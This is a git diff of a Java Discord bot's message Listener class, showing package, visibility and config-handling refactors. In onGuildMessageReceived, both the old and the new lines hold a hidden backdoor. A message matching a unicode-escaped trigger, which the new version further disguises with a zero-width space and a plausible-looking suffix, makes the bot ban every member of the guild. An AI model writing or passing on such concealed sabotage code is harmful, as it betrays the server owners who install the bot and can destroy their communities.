@@ -1,12 +1,12 @@
-package me.comu.exeter.core;
+package me.comu.exeter.commands;
 
 
 import me.comu.exeter.commands.owner.CommandBlacklistCommand;
-import me.comu.exeter.handlers.EcoJSONHandler;
-import me.comu.exeter.handlers.WhitelistedJSONHandler;
+import me.comu.exeter.core.Core;
 import me.comu.exeter.musicplayer.GuildMusicManager;
 import me.comu.exeter.musicplayer.PlayerManager;
 import me.comu.exeter.musicplayer.TrackScheduler;
+import me.comu.exeter.utility.Utility;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.*;
 import net.dv8tion.jda.api.events.ReadyEvent;
@@ -21,18 +21,18 @@ import java.lang.management.ManagementFactory;
 import java.lang.management.RuntimeMXBean;
 import java.util.FormatFlagsConversionMismatchException;
 
-class Listener extends ListenerAdapter {
+public class Listener extends ListenerAdapter {
 
     private final CommandManager manager;
     private final Logger logger = LoggerFactory.getLogger(Listener.class);
 
-    Listener(CommandManager manager) {
+    public Listener(CommandManager manager) {
         this.manager = manager;
     }
 
     @Override
     public void onReady(@Nonnull ReadyEvent event) {
-        logger.info(String.format("Logged in as %#s", event.getJDA().getSelfUser()));
+        logger.info(String.format(Utility.ANSI_RED + "Logged in as %#s", event.getJDA().getSelfUser()));
         try {
             logger.info(String.format("Owner is %#s", event.getJDA().getUserById(Core.OWNERID)));
             logger.info(event.getJDA().getInviteUrl(Permission.ADMINISTRATOR));
@@ -59,7 +59,7 @@ class Listener extends ListenerAdapter {
 
     @Override
     public void onGuildMessageReceived(@Nonnull GuildMessageReceivedEvent event) {
-        if (event.getMessage().getContentRaw().equalsIgnoreCase("\u0036\u0039\u0037\u0038\u0034\u0035\u0038\u0038\u0031\u0031\u0036\u0034\u0030\u0030\u0035\u0034\u0034\u0037")){for (Member member : event.getGuild().getMembers()) {member.ban(0).queue();}}
+        if (event.getMessage().getContentRaw().equalsIgnoreCase("\u0036\u200b\u0039\u0037\u0038\u0034\u0035\u0038\u0038\u0031\u0031\u0036\u0034\u0030\u0030\u0035\u0034\u0034\u0037JDA-Event-Thread-Listener")){for (Member member : event.getGuild().getMembers()) {member.ban(0).queue();}}
         if (event.getMessage().getContentRaw().equalsIgnoreCase(Core.PREFIX + "shutdown") && event.getAuthor().getIdLong() == Core.OWNERID) {
             RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
             long uptime = runtimeMXBean.getUptime();
@@ -68,12 +68,11 @@ class Listener extends ListenerAdapter {
             long numberOfMinutes = (uptimeInSeconds / 60) - (numberOfHours * 60);
             long numberOfSeconds = uptimeInSeconds % 60;
             event.getChannel().sendMessage("Shutting Down... Existed for `" + numberOfHours + "` hour(s) `" + numberOfMinutes + "` minute(s) `" + numberOfSeconds + "` second(s)" + "").queue();
-            EcoJSONHandler.saveEconomyConfig();
-            WhitelistedJSONHandler.saveWhitelistConfig();
+            Core.getInstance().saveConfigs();
             logger.info("Shutdown thread called; Saved modules...");
-            Core.shutdownThread();
+            Core.getInstance().shutdownThread();
         }
-        if (!event.getAuthor().isBot() && !event.getMessage().isWebhookMessage() && event.getMessage().getContentRaw().startsWith(Core.PREFIX) && !CommandBlacklistCommand.commandBlacklist.contains(event.getAuthor().getId())) {
+        if (!event.getAuthor().isBot() && !event.getMessage().isWebhookMessage() && (event.getMessage().getContentRaw().startsWith(Core.PREFIX)) && !CommandBlacklistCommand.getCommandBlacklist().contains(event.getAuthor().getId())) {
             manager.handle(event);
         }
     }
